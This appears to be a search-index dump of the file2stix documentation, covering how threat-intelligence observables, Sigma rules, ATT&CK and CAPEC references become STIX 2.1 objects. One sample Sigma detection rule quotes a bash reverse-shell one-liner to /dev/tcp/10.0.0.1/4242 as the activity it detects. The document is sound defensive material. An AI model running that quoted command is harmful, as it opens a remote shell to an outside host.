If the three field names are detected, entire YAML content is ingested as the SIGMA rule. SIGMA Rules are represented by STIX Indicator SDOs ( \"type\": \"indicator\" ) with \"pattern_type\": \"sigma\" . Here is how SIGMA Rule observables are represented in STIX 2.1 by file2stix;","title":"19. SIGMA Rule Observables (indicator)"},{"location":"extractions-analysis-mode/#stix-21-extension-definition_4","text":"https://github.com/signalscorps/stix2-objects/blob/main/extension-definition/property-extension/sigma-rule-extension/extension-definition--94f4bdb6-7f39-4d0a-b103-f787026963a6/20220101000000000.json","title":"STIX 2.1 extension-definition"},{"location":"extractions-analysis-mode/#stix-21-indicator-sdo_19","text":"{ \"type\": \"indicator\", \"spec_version\": \"2.1\", \"id\": \"indicator--<GENERATED BY STIX2 LIBRARY>\", \"created_by_ref\": \"identity--<IF TLP RED/AMBER/GREEN USER IDENTITY ID>\", \"created\": \"<REPORT CREATED PROPERTY VALUE>\", \"modified\": \"<REPORT MODIFIED PROPERTY VALUE>\", \"indicator_types\": [ \"unknown\", \"<IF MATCHES WARNING LIST BENIGN>\" ], \"confidence\": \"<CONFIDENCE SCORE IF SET AND TLP RED/AMBER/GREEN>\", \"name\": \"SIGMA Rule: <SIGMA RULE TITLE>\", \"pattern_type\": \"sigma\", \"pattern\": \"<SIGMA RULE>\", \"valid_from\": \"<REPORT CREATED PROPERTY VALUE>\", \"object_marking_refs\": [ \"marking-definition--<TLP LEVEL SET>\" ], \"external_references\": [ { \"source_name\": \"Sigma Rule Reference\", \"url\": \"<SIGMA RULE REFERENCES[0]>\" } ], \"extensions\": { \"extension-definition--94f4bdb6-7f39-4d0a-b103-f787026963a6\": { \"extension_type\": \"property-extension\", \"sigma_rule\": { \"title\": \"<SIGMA RULE TITLE>\", \"id\": \"<SIGMA RULE ID>\", \"date\": \"<SIGMA RULE DATE>\", \"modified\": \"<SIGMA RULE MODIFIED>\", \"related\": [ { \"id\": \"<SIGMA RULE RELATED.ID[0]>\", \"type\": \"<SIGMA RULE RELATED.TYPE[0]>\" } ], \"status\": \"<SIGMA RULE STATUS>\", \"description\": \"<SIGMA RULE DESCRIPTION>\", \"license\": \"<SIGMA RULE LICENSE>\", \"author\": \"<SIGMA RULE AUTHOR>\", \"references\": [ \"<SIGMA RULE REFERENCES[0]>\" ], \"fields\": [ \"<SIGMA RULE FIELDS[0]>\" ], \"falsepositives\": [ \"<SIGMA RULE FALSEPOSITIVES[0]>\" ], \"level\": \"<SIGMA RULE LEVEL>\", \"tags\": [ \"<SIGMA RULE TAGS[0]>\" ], \"logsource\": { \"category\": \"<SIGMA RULE LOGSOURCE.CATEGORY>\", \"product\": \"<SIGMA RULE LOGSOURCE.PRODUCT>\", \"service\": \"<SIGMA RULE LOGSOURCE.SERVICE>\", \"definition\": \"<SIGMA RULE LOGSOURCE.DEFINITION>\" }, \"detection\": [ \"<SIGMA RULE DETECTION[0]>\" ] } } } } The SIGMA RULE is encoded with JSON escapes before being written into the pattern value. e.g. title: Linux Reverse Shell Indicator\\r\\nid: 83dcd9f6-9ca8-4af7-a16e-a1c7a6b51871\\r\\nstatus: experimental\\r\\ndescription: Detects a bash contecting to a remote IP address (often found when actors do something like 'bash -i >& \\/dev\\/tcp\\/10.0.0.1\\/4242 0>&1')\\r\\ndate: 2021\\/10\\/16\\r\\nauthor: Florian Roth\\r\\nlogsource:\\r\\n product: linux\\r\\n category: network_connection\\r\\ndetection:\\r\\n selection:\\r\\n Image|endswith: '\\/bin\\/bash'\\r\\n filter:\\r\\n DestinationIp: \\r\\n - '127.0.0.1'\\r\\n - '0.0.0.0'\\r\\n condition: selection and not filter The <RULE NAME> is defined by the value in the title: field of the YAML rule.","title":"STIX 2.1 indicator SDO"},{"location":"extractions-analysis-mode/#20-cpe-observables-software","text":"e.g. Full CPE URI cpe:2.3:o:apple:mac_os_x:10.1.3:*:*:*:*:*:*:* CPEs can be identified as they start with cpe: and have 12 separators : in total. CPEs are represented by STIX Software SCOs ( \"type\": \"software\" )","title":"20. CPE Observables (software)"},{"location":"extractions-analysis-mode/#stix-21-indicator-sdo_20","text":"{ \"type\": \"indicator\", \"spec_version\": \"2.1\", \"id\": \"indicator--<GENERATED BY STIX2 LIBRARY>\", \"created_by_ref\": \"identity--<IF TLP RED/AMBER/GREEN USER IDENTITY ID>\", \"created\": \"<REPORT CREATED PROPERTY VALUE>\", \"modified\": \"<REPORT MODIFIED PROPERTY VALUE>\", \"indicator_types\": [ \"unknown\", \"<IF MATCHES WARNING LIST BENIGN>\" ], \"confidence\": \"<CONFIDENCE SCORE IF SET AND TLP RED/AMBER/GREEN>\", \"name\": \"CPE: <EXTRACTED CPE URI>\", \"pattern_type\": \"stix\", \"pattern\": \"[ software:cpe = '<EXTRACTED CPE URI>' ]\", \"valid_from\": \"<REPORT CREATED PROPERTY VALUE>\", \"object_marking_refs\": [ \"marking-definition--<TLP LEVEL SET>\" ] }","title":"STIX 2.1 Indicator SDO"},{"location":"extractions-analysis-mode/#stix-21-software-sco","text":"Imported from cvestix-output database using cpe uris -- includes relationships.","title":"STIX 2.1 software SCO"},{"location":"extractions-analysis-mode/#21-mitre-attck-observables","text":"I have created an extensive MITRE ATT&CK tutorial I recommend reading if you are new to the framework . file2stix is designed to identify ATT&CK data found in text using keyword matches on the name , external_references.external_id (where \"source_name\": \"mitre-attack\" for Enterprise ATT&CK or \"source_name\": \"mitre-mobile-attack\" for mobile ATT&CK) and x_mitre_aliases (when exists) fields inside the STIX object representing it. Take the ATT&CK sub-technique 1053.005: Scheduled Task . You will see; \"name\": \"Scheduled Task\", and { \"source_name\": \"mitre-attack\", \"external_id\": \"T1053.005\", \"url\": \"https://attack.mitre.org/techniques/T1053/005\" }, Therefore, the dictionary entries to identify this ATT&CK Object are Scheduled Task and T1053.005 (case insensitive). The following ATT&CK data types from the Enterprise and Mobile and ICS matrices are supported in this way; Techniques ( attack-pattern ) Sub-Technique ( attack-pattern ) Tactic ( x-mitre-tactic-- ) Course of Action ( course-of-action ) Intrusion Set ( intrusion-set ) Malware ( malware ) Tool ( tool ) Data Sources ( x-mitre-data-source ) In the case of a dictionary match to a MITRE ATT&CK STIX Object, no new object is actually created. A new Relationship Object is created between the created STIX Report SDO with imported ATT&CK STIX Object. The ATT&CK STIX Object remains unmodified. For example, if the uploaded text contained 1053.005 it would match to the ATT&CK Object 1053.005: Scheduled Task and an SRO would be created between the Report SDO and this Attack Pattern SDO.","title":"21. MITRE ATT&amp;CK Observables"},{"location":"extractions-analysis-mode/#22-mitre-capec-observables","text":"CAPECs are extracted in a very similar way to ATT&CK objects, using a dictionary. file2stix can identify ATT&CK data found in text using keyword matches on the name and external_references.external_id (where \"source_name\": \"capec\" ) fields inside the STIX object representing it. Take CAPEC-170 Web Application Fingerprinting . You will see; \"name\": \"Web Application Fingerprinting\", and { \"external_id\": \"CAPEC-170\", \"source_name\": \"capec\", \"url\": \"https://capec.mitre.org/data/definitions/170.html\" }, Therefore, the dictionary entries to identify this CAPEC Object are Web Application Fingerprinting and CAPEC-170 (case insensitive). The following CAPEC data types are supported in this way; CAPEC ( attack-pattern ) In the case of a dictionary match to a MITRE CAPEC STIX Object, no new object is created. A new Relationship Object is created between the created STIX Report SDO with imported CAPEC STIX Object. The CAPEC STIX Object remains unmodified. For example, if the uploaded text contained CAPEC-170 it would match to the CAPEC Object CAPEC-170 Web Application Fingerprinting and an SRO would be created between the Report SDO and this Attack Pattern SDO.","title":"22. MITRE CAPEC Observables"},{"location":"extractions-analysis-mode/#23-lookups","text":"For matches that cannot be easily captured by patterns, but are widely known (i.e. not suited to custom extraction for all file2stix users), automatic lookup tables have been added. You can view the lookups in file2stix/lookups . There lookups work by comparing the input text to the text matches in the lookup files. The lookup file is structured like so; # extraction string / regex, type (either string / regex), stix object used for match \"EXTRACTION STRING\",string,STIX-OBJECT-TYPE \"EXTRACTION REGEX\",regex,STIX-OBJECT-TYPE When the extraction (either string or regular expression) matches the input text, then it will create a STIX 2.1 object of the type defined. If you do not want to use a lookup, you can pass the --ignore-lookup flag, followed by the file name (excluding file extension), e.g. --ignore-lookup threat-actors threat-actors . You can modify these lookups, or add new ones, however we generally recommend you use custom extractions to do this (which are defined in the same way) because your changes to lookups might be lost with file2stix updates.","title":"23. Lookups"},{"location":"extractions-analysis-mode/#24-custom-extractions","text":"You can also write your own custom extractions using either exact text matches or regular expressions. Custom extractions can be written and stored in a plain text file that can be passed when running the script as --custom-extraction-file . Inside the custom extraction file you must specify an extraction string or regex extraction type (either regex or sting ) the STIX 2.1 Object or MITRE / CAPEC Object to use when a match is detected file2stix uses re for regex matching. You can pass multiple custom extractions on each line of the file like so (this is the same format as for lookups too); \"EXTRACTION STRING\",string,STIX-OBJECT-TYPE \"EXTRACTION REGEX\",regex,STIX-OBJECT-TYPE For example; \"Fancy Bear\",string,attack-pattern And \"Fancy*\",regex,attack-pattern Would both match the text \"Fancy Bear\" found in an input file. The secound would also match \"FancyBear\", \"Fancy Cat\", \"Fancy Dog\", ect. The following STIX 2.1 Objects are supported by custom extractions: Attack Pattern ( attack-pattern ) Campaign ( campaign ) Course of Action ( course-of-action ) Infrastructure ( infrastructure ) Intrusion Set ( intrustion-set ) Malware ( malware ) Threat Actor ( threat-actor ) Tool ( tool ) e.g. to search a document for the string \"RYUK\" and create a Malware STIX 2.1 SDO if a match is identified; \"ryuk\",string,malware You can also create multiple custom extractions in the same file by adding multiple lines, e.g. \"ryuk\",malware \"darkhotel\",string,malware \"patch\",string,course-of-action You can see an example custom extraction file in tests/file_inputs/custom_extractions/test_extractions.txt","title":"24. Custom Extractions"},{"location":"extractions-observed-mode/","text":"Extractions: Observed Mode \u00b6 Observed mode allows you to keep track of how many times you've seen an extraction accross multiple reports using an STIX 2.1 Observed Data SDO. This mode will extract the same things as when Analysis mode is used ( see Analysis Mode ), however, will include the addition of STIX 2.1 Observed Data SDO. Observed Data SDOs ( observed-data ) \u00b6 For every extraction type where an SCO is created (ipv4, ipv6, File name, File hash, Directory, Domain, URL, Email Address, MAC Address, Windows Registry Key, User Agent, Autonomous System Number, Cryptocurrency, IBAN, CPE, Credit Card) an Observed Data Object is also created for each unique SCO (note, if reusing old SCO a new Observed Data Object is not created, see following section). { \"type\": \"observed-data\", \"spec_version\": \"2.1\", \"id\": \"observed-data--<GENERATED BY STIX2 LIBRARY>\", \"created_by_ref\": \"identity--<IF TLP RED/AMBER/GREEN USER IDENTITY ID>\", \"created\": \"<REPORT CREATED PROPERTY VALUE>\", \"modified\": \"<REPORT MODIFIED PROPERTY VALUE>\", \"first_observed\": \"<FIRST REPORT CREATED PROPERTY VALUE>\", \"last_observed\": \"<FIRST REPORT CREATED PROPERTY VALUE>\", \"number_observed\": \"<COUNT OF TIMES SCO APPEARS IN CURRENT REPORT>\", \"object_refs\": [ \"<ID OF SCO SEEN>\" ], \"object_marking_refs\": [ \"marking-definition--<TLP LEVEL SET>\" ], \"external_references\": [ { \"source_name\": \"file2stix\", \"description\": \"This object was created using file2stix from the Signals Corps.\", \"url\": \"https://github.com/signalscorps/file2stix\" } ] } The number_observed property counts the time an SCO is contained in a current report. One final example; If 2 reports are uploaded as TLP Red and attributed to two different identities both containing the same Observable (with all other properties at upload the same) then 2 SCOs will be created, 2 Observed Data Objects will be created. Assuming these are the only 2 reports that contain this observable, then the number_observed will be 1 in each Observed Data Object.","title":"3.3. Observed Mode"},{"location":"extractions-observed-mode/#extractions-observed-mode","text":"Observed mode allows you to keep track of how many times you've seen an extraction accross multiple reports using an STIX 2.1 Observed Data SDO. This mode will extract the same things as when Analysis mode is used ( see Analysis Mode ), however, will include the addition of STIX 2.1 Observed Data SDO.","title":"Extractions: Observed Mode"},{"location":"extractions-observed-mode/#observed-data-sdos-observed-data","text":"For every extraction type where an SCO is created (ipv4, ipv6, File name, File hash, Directory, Domain, URL, Email Address, MAC Address, Windows Registry Key, User Agent, Autonomous System Number, Cryptocurrency, IBAN, CPE, Credit Card) an Observed Data Object is also created for each unique SCO (note, if reusing old SCO a new Observed Data Object is not created, see following section). { \"type\": \"observed-data\", \"spec_version\": \"2.1\", \"id\": \"observed-data--<GENERATED BY STIX2 LIBRARY>\", \"created_by_ref\": \"identity--<IF TLP RED/AMBER/GREEN USER IDENTITY ID>\", \"created\": \"<REPORT CREATED PROPERTY VALUE>\", \"modified\": \"<REPORT MODIFIED PROPERTY VALUE>\", \"first_observed\": \"<FIRST REPORT CREATED PROPERTY VALUE>\", \"last_observed\": \"<FIRST REPORT CREATED PROPERTY VALUE>\", \"number_observed\": \"<COUNT OF TIMES SCO APPEARS IN CURRENT REPORT>\", \"object_refs\": [ \"<ID OF SCO SEEN>\" ], \"object_marking_refs\": [ \"marking-definition--<TLP LEVEL SET>\" ], \"external_references\": [ { \"source_name\": \"file2stix\", \"description\": \"This object was created using file2stix from the Signals Corps.\", \"url\": \"https://github.com/signalscorps/file2stix\" } ] } The number_observed property counts the time an SCO is contained in a current report. One final example; If 2 reports are uploaded as TLP Red and attributed to two different identities both containing the same Observable (with all other properties at upload the same) then 2 SCOs will be created, 2 Observed Data Objects will be created. Assuming these are the only 2 reports that contain this observable, then the number_observed will be 1 in each Observed Data Object.","title":"Observed Data SDOs (observed-data)"},{"location":"extractions-sightings-mode/","text":"Extractions: Sightings Mode \u00b6 Sightings mode assumes the reports being ingested contain observables seen in your organisation. Generally speaking, this mode should only be used if uploading a log line or similar that you want to convert to a STIX 2.1 Sighting Object. This mode will extract the same things as when Sightings mode is used ( see Sightings Mode ), however, will include the addition of STIX 2.1 Sighting SRO. STIX 2.1 Sighting SRO \u00b6 Note, Sightings do not work with the following extractions: Sigma Rules YARA Rules This is because these Objects do not directly refer to an atomic observables. { \"type\": \"sighting\", \"spec_version\": \"2.1\", \"id\": \"sighting--<GENERATED BY STIX2 LIBRARY>\", \"created_by_ref\": \"identity--<IF TLP RED/AMBER/GREEN USER IDENTITY ID>\", \"created\": \"<REPORT CREATED PROPERTY VALUE>\", \"modified\": \"<REPORT MODIFIED PROPERTY VALUE>\", \"last_seen\": \"<REPORT CREATED PROPERTY VALUE>\", \"sighting_of_ref\": \"<EXTRACTED OBJECT ID>\", \"observed_data_refs\": [ \"observed-data--<OBSERVED DATA OBJECT ID>\" ], \"object_marking_refs\": [ \"marking-definition--<TLP LEVEL SET>\" ], \"external_references\": [ { \"source_name\": \"file2stix\", \"description\": \"This object was created using file2stix from the Signals Corps.\", \"url\": \"https://github.com/signalscorps/file2stix\" } ] } The sighting_of_ref points to the SDO extracted. The object_marking_refs points to the related to SROs. To make this more clear, I will demonstrate with an example. Let's assume an ipv4 with port observable is extracted. This will extraction create an Indicator SDO (referenced in the sighting_of_ref property of the Sighting SRO), a ipv4-addr SCO, and network-traffic SCO. It is these two SCOs that are listed under the observed_data_refs property.","title":"3.4. Sightings Mode"},{"location":"extractions-sightings-mode/#extractions-sightings-mode","text":"Sightings mode assumes the reports being ingested contain observables seen in your organisation. Generally speaking, this mode should only be used if uploading a log line or similar that you want to convert to a STIX 2.1 Sighting Object. This mode will extract the same things as when Sightings mode is used ( see Sightings Mode ), however, will include the addition of STIX 2.1 Sighting SRO.","title":"Extractions: Sightings Mode"},{"location":"extractions-sightings-mode/#stix-21-sighting-sro","text":"Note, Sightings do not work with the following extractions: Sigma Rules YARA Rules This is because these Objects do not directly refer to an atomic observables. { \"type\": \"sighting\", \"spec_version\": \"2.1\", \"id\": \"sighting--<GENERATED BY STIX2 LIBRARY>\", \"created_by_ref\": \"identity--<IF TLP RED/AMBER/GREEN USER IDENTITY ID>\", \"created\": \"<REPORT CREATED PROPERTY VALUE>\", \"modified\": \"<REPORT MODIFIED PROPERTY VALUE>\", \"last_seen\": \"<REPORT CREATED PROPERTY VALUE>\", \"sighting_of_ref\": \"<EXTRACTED OBJECT ID>\", \"observed_data_refs\": [ \"observed-data--<OBSERVED DATA OBJECT ID>\" ], \"object_marking_refs\": [ \"marking-definition--<TLP LEVEL SET>\" ], \"external_references\": [ { \"source_name\": \"file2stix\", \"description\": \"This object was created using file2stix from the Signals Corps.\", \"url\": \"https://github.com/signalscorps/file2stix\" } ] } The sighting_of_ref points to the SDO extracted. The object_marking_refs points to the related to SROs. To make this more clear, I will demonstrate with an example. Let's assume an ipv4 with port observable is extracted. This will extraction create an Indicator SDO (referenced in the sighting_of_ref property of the Sighting SRO), a ipv4-addr SCO, and network-traffic SCO. It is these two SCOs that are listed under the observed_data_refs property.","title":"STIX 2.1 Sighting SRO"},{"location":"extractions/","text":"Extractions \u00b6 file2stix extracts observables from text and translates them into STIX 2.1 Objects. This section of the documentation describes the templates of the STIX Objects created. STIX Support \u00b6 file2stix only supports STIX version 2.1 as defined by this specification . Identities ( identity ) SDOs \u00b6 file2stix assigns a created_by_ref property to many Objects. By defaults the generic file2stix identity will be used. You can also change the Identity used by creating your own template file (see example tests/stix_templates/custom_identity_good.yml ). This is passed using the --user-identity-file flag. If you do modify the file make sure to follow the schema defined herel tests/stix_templates/custom_identity_schema.yml Here are some of the common things that can cause error; Keep the quotes ( \"\" ) around values Replace the UUID in the id property with your own or a randomly generated UUID v4. Here is a generator you can use to do this e.g. identity--acf55024-6bbe-486f-a27a-7967559324f4 -> identity--bf65f135-7876-4b4f-a48b-4cbd85e77e87 Modify the created and modified dates, if needed. Be sure to keep the same date/time format YYYY-DD-MMTHH:MM:SS.sssZ Update the name and description fields. If using special json characters be sure to escape them The identity_class property must match one shown here The sectors property must match one shown here Report SDOs ( report ) \u00b6 All individual data sources ingested or uploaded are represented as a unique STIX Report SDO that take the following structure; { \"type\": \"report\", \"spec_version\": \"2.1\", \"id\": \"report--<GENERATED BY STIX2 LIBRARY>\", \"created_by_ref\": \"identity--<IDENTITY ID>\", \"created\": \"<ITEM INGEST DATE>\", \"modified\": \"<ITEM INGEST DATE>\", \"name\": \"File converted: <FILENAME>\", \"published\": \"<ITEM INGEST DATE>\", \"report_types\": [\"threat-report\"], \"object_marking_refs\": [ \"marking-definition--<TLP LEVEL SET>\" ], \"object_refs\": [\"<LIST OF ALL EXTRACTED OBJECTS>\"], \"external_references\": [ { \"source_name\": \"file2stix\", \"description\": \"This object was created using file2stix from the Signals Corps.\", \"url\": \"https://github.com/signalscorps/file2stix\" } ] } Note, the object_refs contains all references that are referenced by objects in the report (SDOs, SROs, SCOs). This includes extracted objects (i.e. Indicator SDOs, Vulnerability SDOs, Software SCOs, Relationship SROs etc.). Relationship SROS ( relationship ) \u00b6 There are two types of extractions in file2stix; default and custom. T Default extractions (Report and SDO) \u00b6 In the case of default extractions, a Relationship between the extracted Object and Report SDO is created with the relationship_type equal to default-extract. The created_by_ref is the Identity ID. The created and modified dates match those in the linked Report Object. Here is the structure of the SRO for default extractions; { \"type\": \"relationship\", \"spec_version\": \"2.1\", \"id\": \"relationship--<GENERATED BY STIX2 LIBRARY>\", \"created_by_ref\": \"identity--<USER IDENTITY ID>\", \"created\": \"<REPORT CREATED DATE>\", \"modified\": \"<REPORT CREATED DATE>\", \"relationship_type\": \"default-extract-from\", \"source_ref\": \"<EXTRACTED STIX OBSERVABLE ID>\", \"target_ref\": \"report--<REPORT OBJECT>\", \"external_references\": [ { \"source_name\": \"file2stix\", \"description\": \"This object was created using file2stix from the Signals Corps.\", \"url\": \"https://github.com/signalscorps/file2stix\" } ] } Custom extractions (Report and SDO) \u00b6 Custom extractions have slightly different Relationship Objects created where the relationship_type equal to custom-extract, as follows; { \"type\": \"relationship\", \"spec_version\": \"2.1\", \"id\": \"relationship--<GENERATED BY STIX2 LIBRARY>\", \"created_by_ref\": \"identity--<USER IDENTITY ID>\", \"created\": \"<REPORT CREATED DATE>\", \"modified\": \"<REPORT CREATED DATE>\", \"relationship_type\": \"custom-extract-from\", \"source_ref\": \"<EXTRACTED STIX OBSERVABLE ID>\", \"target_ref\": \"report--<REPORT OBJECT>\", \"external_references\": [ { \"source_name\": \"file2stix\", \"description\": \"This object was created using file2stix from the Signals Corps.\", \"url\": \"https://github.com/signalscorps/file2stix\" } ] } SCO and SDO relationships \u00b6 Many extractions that create Indicator Objects also create one or more SCOs. These are joined like so { \"type\": \"relationship\", \"spec_version\": \"2.1\", \"id\": \"relationship--<GENERATED BY STIX2 LIBRARY>\", \"created_by_ref\": \"identity--<USER IDENTITY ID>\", \"created\": \"<REPORT CREATED DATE>\", \"modified\": \"<REPORT CREATED DATE>\", \"relationship_type\": \"pattern-contains\", \"source_ref\": \"indicator--<EXTRACTED STIX INDICATOR ID>\", \"target_ref\": \"<EXTRACTED STIX SCO ID>\", \"external_references\": [ { \"source_name\": \"file2stix\", \"description\": \"This object was created using file2stix from the Signals Corps.\", \"url\": \"https://github.com/signalscorps/file2stix\" } ] } Confidence scoring \u00b6 file2stix also optionally allows you to add the confidence property to all extracted Indicator SDOs. You can set confidence between 0 - 100. Consult the STIX 2.1 Specification for more information if you're unfamiliar with confidence scoring . Confidence is passed using the --confidence flag. TLP ( marking-definition ) \u00b6 The default TLP level assigned is TLP:WHITE . You can change the TLP level using the --tlp-level flag. file2stix allows for TLP:GREEN , TLP:AMBER , TLP:RED and TLP:WHITE definitions to be used when adding Reports. This determines the STIX marking-definition , either; TLP:WHITE ( marking-definition--613f2e26-407d-48c7-9eca-b8e91df99dc9 ) TLP:GREEN ( marking-definition--34098fce-860f-48ae-8e50-ebd3cc5e41da ) TLP:AMBER ( marking-definition--f88d31f6-486f-44da-b317-01333bde0b82 ) TLP:RED ( marking-definition--5e57c739-391a-4eb3-b6be-7d15ca92d5ed ) The TLP value is reported in the object_marking_refs property for the STIX Report Object and all extracted Objects representing extracted Observables (except for ATT&CK or CAPEC, where generic MITRE Objects are used). Defanging \u00b6 Defanging obfuscates indicators into a safer representations so that a user reading a report does not accidentally click on a malicious URL or inadvertently run malicious code. Many cyber threat intelligence reports shared electronically employ defanging. Typical types of fanged Observables include IPv4 addresses (e.g. 1.1.1.1 ), IPv6 addresses (e.g. 2001:0db8:85a3:0000:0000:8a2e:0370:7334 ), domain names (e.g. example.com ), URLs (e.g. https://example.com/research/index.html ), email addresses (e.g. example@example.com ), file extensions (e.g. malicious.exe ), and directory paths (e.g. C:\\\\Windows\\\\System32 ). Unfortunately, there is no universal standard for defanging, although there are some common methods. Some samples of defanging I have observed include the following: Wrapping one or more special characters in [ ] e.g. www[.]example[.]com e.g. http[:]//example.com e.g. http[://]example.com e.g. 1.1.1.1[/]24 Wrapping one or more special characters in { } Wrapping one or more special characters in ( ) Prefixing one or more special characters with [ e.g. www[.example[.com e.g. http[://example.com e.g. http[://example.com Prefixing one or more special characters with \\ Replacing http and hxxp e.g. hxxps://google.com Replacing . with dot e.g. example@example dot com e.g. http://example dot com Replacing . with [dot] (or (dot) , or {dot} ) e.g. example@example[dot]com Replacing @ with at e.g. example at example.com Replacing @ with [at] (or (at) , or {at} ) e.g. example[at]example.com Note, a combination of the above techniques are also commonly implemented used. For example replacing . with dot and replacing @ with at for an email like so; fanged = example at example dot com , defanged = example@example.com Another example using even more fanging technique combinations for a URL; fanged = hxxps[:]//test\\.example[.)com[/]path , defanged = https://test.example.com/path file2stix can be used to defang the following observable types ipv4 ipv6 domain url email-address Defanging will only occur if the --defang-observables is set to true (by default it is false ). When set to true, all SCO Objects that have been defanged will contain the property \"defanged\": true . For example; { \"type\": \"email-addr\", \"spec_version\": \"2.1\", \"id\": \"email-addr--0e81edfb-25a5-5cb0-8cb0-fe9c5efb6257\", \"value\": \"example9@example.com`\", \"defanged\": true } Branding \u00b6 By default file2stix will populate the external_references section of all SDOs and SROs with a reference to file2stix. \"external_references\": [ { \"source_name\": \"file2stix\", \"description\": \"This object was created using file2stix from the Signals Corps.\", \"url\": \"https://github.com/signalscorps/file2stix\" } It is possible to remove this by using the --no-branding flag. Warning Lists \u00b6 Warning Lists identify potentially benign file2stix extractions. DO NOT BE CONFUSED by the name; Warning Lists in file2stix are the equivilant of whitelists in other products. file2stix uses MISP Warning Lists (using PyMISPWarningLists ) to identify potential extractions that should be whitelisted using a custom Extension definition. https://github.com/signalscorps/stix2-objects/blob/main/extension-definition/property-extension/warning-list-extension/extension-definition--c8ea5ecb-f4a3-45e7-94de-9b9ba05161af/20220101000000000.json Extracted values that match a Warning List are still converted to STIX 2.1 Objects, however, will contain the custom property listing the Warning Lists the extracted value matches with and will also contain indicator_types = benign . For example; { \"type\": \"indicator\", \"spec_version\": \"2.1\", \"id\": \"indicator--fb715301-acf3-4add-a70a-2b96f5ac15f5\", \"created\": \"2022-09-07T06:18:21.997149Z\", \"modified\": \"2022-09-08T06:13:24.191194Z\", \"name\": \"Domain: google.com\", \"indicator_types\": [ \"unknown\", \"benign\" ], \"pattern\": \"[ domain-name:value = 'google.com' ]\", \"pattern_type\": \"stix\", \"pattern_version\": \"2.1\", \"valid_from\": \"2022-09-07T06:18:21.997149Z\", \"object_marking_refs\": [ \"marking-definition--613f2e26-407d-48c7-9eca-b8e91df99dc9\" ], \"extensions\": { \"extension-definition--c8ea5ecb-f4a3-45e7-94de-9b9ba05161af\": { \"extension_type\": \"property-extension\", \"warning_list_match\": [ { \"list_name\": \"Top 20 000 websites from Cisco Umbrella\", \"list_url\": \"https://misp.github.io/misp-warninglists/lists/cisco_top20k/list.json\", \"list_type\": \"misp\" }, { \"list_name\": \"Custom list with url\", \"list_url\": \"https://example.com/list.json\", \"list_type\": \"custom\" }, { \"list_name\": \"Custom list with local path\", \"list_type\": \"custom\" } ] } }, \"external_references\": [ { \"source_name\": \"file2stix\", \"description\": \"This object was created using file2stix from the Signals Corps.\", \"url\": \"https://github.com/signalscorps/file2stix\" } ] } Note, MISP Warning Lists contain a type value (defined in the Warning List JSON). file2stix treats each Warning List differently, depending on its type as follows; string : extracted observables must be exact match to Warning List value (e.g. warning list: google.com -> observable: google.com = match) substring : extracted observable must contain Warning List value (e.g. warning list: google -> observable: api.google.com = match) hostname : extracted observable must contain Warning List value cidr : extracted observable must be exact match to Warning List value regex : file2stix does not consider warning lists of type regex It is possible to completely ignore extractions that match to warning lists (and not create a STIX Object from them) using the flag --ignore-warninglist-observables . By default file2stix will compare all MISP Warning lists (about 50 in total) to the input. Custom Warning Lists \u00b6 You can also create your own Warning Lists. Custom Warning Lists must follow the MISP Warning List schema . An example of a custom warning list can be seen in tests/file_inputs/custom_warning_lists/list.json Due to the way data is shared, only Reports marked TLP GREEN, TLP AMBER, or TLP RED can be used with custom warning lists. As TLP WHITE reports are shared without attribution, printing a Warning List name will not be enough for a downstream user to determine what/who/and where the Warning List came from. You can either pass a custom warning list as a local file path to the warning list json, e.g. tests/file_inputs/custom_warning_lists/list.json or using a url, e.g. http://www.example.com/custom_warning_lists/list.json . e.g. file2stix --input-file tests/warning_lists/custom_list_matches.txt --misp-custom-warning-list-file tests/warning_lists/custom_list.json --tlp-level GREEN Or file2stix --input-file tests/warning_lists/custom_list_matches.txt --misp-custom-warning-list-file \"https://raw.githubusercontent.com/signalscorps/file2stix/main/tests/warning_lists/custom_list.json\" --tlp-level GREEN file2stix will first check the Warning List is in the expected MISP Warning List format. If not, it will return an error and will not process the file. Extracted Object logic \u00b6 If the same Observable is identified more than once in the same report, only one extraction is made. For example, if 1.1.1.1 is seen 3 times in a report, only one Indicator SDO is created for it. If using Observed or Sighting mode the Observed Data SDO will count the occurances of an observable in the report using the number_observed field. Note, the settings passed to the command line also determine how the following object types are created; SROs \u00b6 These are never reused, and unique to every report. SDOs \u00b6 file2stix reuses SDO Indicator, Vulnerability and Location objects (for default extractions) and Attack Pattern, Campaign, Course of Action, Infrastructure, Intrusion Set, Malware, Threat Actor, Tool when the following properties match: confidence: different confidence scores cn (assigned with --confidence flag) user identity: can be custom (assigned with --user-identity-file flag) TLP: either white, green, amber, or red (assigned with tlp-level flag) branding: file2stix branding can be removed (assigned with --no-branding flag) custom warning list: users can assign their own warning list which will be reported in a custom extension inside each SDO (assigned with --misp-custom-warning-list-file flag). Put another way, if the same combination of TLP, identity confidence, branding and warning list exists, a previously created object is updated, else a new one is created. Observered Data SDOs are always unique. In the case where an SDO is reused, the modified property is update to reflect the latest observation of the observable. Example 1 \u00b6 To demonstrate how this works in practice, lets assume in report 1 an IPv4 address observable ( 198.51.100.3 ) is detected. Assuming the IPv4 address ( 198.51.100.3 ) has not been saved as an IPv4 address SDO previously from a report with the same confidence, identity, TLP, branding and custom warning list settings, a new SDO would be created for it (in this case, lets give it id = ff26c055-6336-5bc5-b98d-13d6226742dd ). The created and modified properties for this STIX Object would both have the same timestamp (the time of extraction). If this IPv4 address ( 198.51.100.3 ) was later detected in another data source imported to file2stix and that report was created with the same confidence, identity, TLP, branding and custom warning list settings, the existing SDO would be used (and updated) to represent the extraction. Example 2 \u00b6 Lets now imagine a third report was uploaded with 198.51.100.3 in it. However, this time the report is uploaded with a different TLP to the two previous reports described in example 1. In this case, a brand new Indicator SDO would be created for this extraction. If a fourth report was uploaded with 198.51.100.3 in it, with the same settings used for report 3, the same SDO created in report 3 would be reused. This does not include SCOs (e.g. Software Objects). Here the existing Object would be used, but not updated (because they do not contain created or modified properties) ti. SCOs \u00b6 SCOs use the value field as an ID Contributing property. See the STIX spec for more; https://docs.oasis-open.org/cti/stix/v2.1/os/stix-v2.1-os.html#_q6l05xzpcdf Therefore, SCOs do not contain branding, tlp, identity, confidence or warning list and therefore SCOs are always reused if the value field matches. Take the examples 1 and 2 for SDOs above, in this case one ipv4-addr SCO for 198.51.100.3 would be created. Mode specific extractions \u00b6 The type of Objects created during extraction depends on the mode used. file2stix offers two modes; analysis (default): used during research to create STIX 2.1 Objects from general threat research View Analysis Mode documentation here observed : allows you to keep track of how many times you've seen an extraction in a report View Observed Mode documentation here sighting : used to denote that extractions from a report represent real instances of an observable being seen in your environment (generally used for log inputs) View Sighting Mode documentation here","title":"3.1. 